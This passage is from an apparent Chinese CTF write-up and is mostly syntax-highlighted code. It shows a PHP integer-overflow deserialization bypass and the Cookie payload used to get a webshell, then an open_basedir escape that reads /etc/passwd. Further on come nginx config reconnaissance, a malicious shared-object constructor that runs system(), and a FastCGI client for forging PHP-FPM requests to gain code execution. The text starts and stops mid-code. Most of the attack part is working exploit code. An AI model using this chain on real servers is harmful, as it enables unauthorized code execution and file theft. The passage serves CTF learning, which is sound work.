punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">count</span> <span class="token operator">=</span> <span class="token number">9223372036854775806</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"die"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><img src="/article/bluehat2021/image-20210503132210543.png" class="" title="count-test" loading="lazy"><p>在 PHP 中，有三种数组类型：</p><ul><li><p>索引数组 - 带有数字索引的数组</p><p> <code>$a = array(&quot;1&quot; =&gt; &quot;admin&quot;, &quot;0&quot; =&gt; &quot;gyy&quot;);</code>  &#x2F;&#x2F; key被双引号包裹</p></li><li><p>关联数组 - 带有指定键的数组</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token number">9223372036854775805</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span> => <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value</span><span class="token punctuation">&#125;</span></span>\r\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果如下</span><span class="token comment">//array(3) &#123;</span><span class="token comment">//    [9223372036854775806]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [9223372036854775807]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [-9223372036854775808]=></span><span class="token comment">//  int(1)</span><span class="token comment">//&#125;</span><span class="token comment">//9223372036854775806 => 1</span><span class="token comment">//9223372036854775807 => 1</span><span class="token comment">//-9223372036854775808 => 1</span><span class="token comment">//bool(true)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>多维数组 - 包含一个或多个数组的数组</p><p>俗称套娃</p></li></ul><p>感兴趣的师傅可以自己测试一下，这里只需要<code>$a-&gt;count=9223372036854775806</code>即long最大值时即可绕过(64位即2^64)</p><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>直接拿shell进去看看</p><img src="/article/bluehat2021/image-20210503134715662.png" class="" title="shell" loading="lazy"><p>这里用蚁剑示例，注意header里需要加Cookie为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</code></p><p>查看phpinfo，发现有很多disable_function</p><pre class="language-none"><code class="language-none">disable_function：stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursivedisable_classes:Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>还有open_basedir限制，利用自动化脚本无法突破。由于html目录可写，利用<code>glob://</code>协议先探测目录</p><blockquote><p>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</p></blockquote><pre class="language-none"><code class="language-none">&lt;?phpprintf(&#39;&lt;b&gt;open_basedir : %s &lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;, ini_get(&#39;open_basedir&#39;));$file_list &#x3D; array();&#x2F;&#x2F; normal files$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;&#x2F;&#x2F; special files (starting with a dot(.))$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;.*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;        echo &quot;&#123;$f&#125;&lt;br&#x2F;&gt;&quot;;&#125;?&gt;</code></pre><img src="/article/bluehat2021/image-20210503135244699.png" class="" title="flag" loading="lazy"><p>再利用如下，读取文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>读取php.ini</p><p><code> /usr/local/etc/php/php.ini</code></p><img src="/article/bluehat2021/image-20210503140055221.png" class="" title="ext" loading="lazy"><p>发现异常.so文件，可能是要加载然后pwn它，实在不会。</p><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// normal files</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///etc/nginx/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$f</span><span class="token punctuation">&#125;</span></span>&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>读<code>/etc/nginx/nginx.conf</code>，发现有<code>include /etc/nginx/sites-enabled/*;</code></p><p>转头读取<code>/etc/nginx/sites-enabled/default</code></p><img src="/article/bluehat2021/image-20210503142114737.png" class="" title="cgi" loading="lazy"><p>发现在9001端口开有FastCGI服务，phpinfo中也表明该项目为FPM&#x2F;FastCGI，可以通过未授权打FPM rce</p><img src="/article/bluehat2021/image-20210503141634940.png" class="" title="phpinfo" loading="lazy"><h3 id="加载恶意so文件"><a href="#加载恶意so文件" class="headerlink" title="加载恶意so文件"></a>加载恶意so文件</h3><p>写.so扩展</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / >/var/www/html/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><small>小插曲：这里发现输出到<code>/var/www/html/1</code>发现不行，结果名字换成a就可了，离谱</small></p><p>编译下</p><pre class="language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so</code></pre><p>注意的是用macos和linux编译是不同的，得用linux编译，编译完后上传至<code>/var/www/html</code></p><h3 id="伪造FastCGI请求PHP-CGI"><a href="#伪造FastCGI请求PHP-CGI" class="headerlink" title="伪造FastCGI请求PHP-CGI"></a>伪造FastCGI请求PHP-CGI</h3><p>同样写在html目录</p><blockquote><p>用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：</p><blockquote><p>{<br>‘GATEWAY_INTERFACE’: ‘FastCGI&#x2F;1.0’,<br>‘REQUEST_METHOD’: ‘GET’,<br>‘SCRIPT_FILENAME’: ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php’,<br>‘SCRIPT_NAME’: ‘&#x2F;index.php’,<br>‘QUERY_STRING’: ‘?a&#x3D;1&amp;b&#x3D;2’,<br>‘REQUEST_URI’: ‘&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2’,<br>‘DOCUMENT_ROOT’: ‘&#x2F;var&#x2F;www&#x2F;html’,<br>‘SERVER_SOFTWARE’: ‘php&#x2F;fcgiclient’,<br>‘REMOTE_ADDR’: ‘127.0.0.1’,<br>‘REMOTE_PORT’: ‘12345’,<br>‘SERVER_ADDR’: ‘127.0.0.1’,<br>‘SERVER_PORT’: ‘80’,<br>‘SERVER_NAME’: “localhost”,<br>‘SERVER_PROTOCOL’: ‘HTTP&#x2F;1.1’<br>}</p></blockquote></blockquote><ul><li>通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></li><li>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> 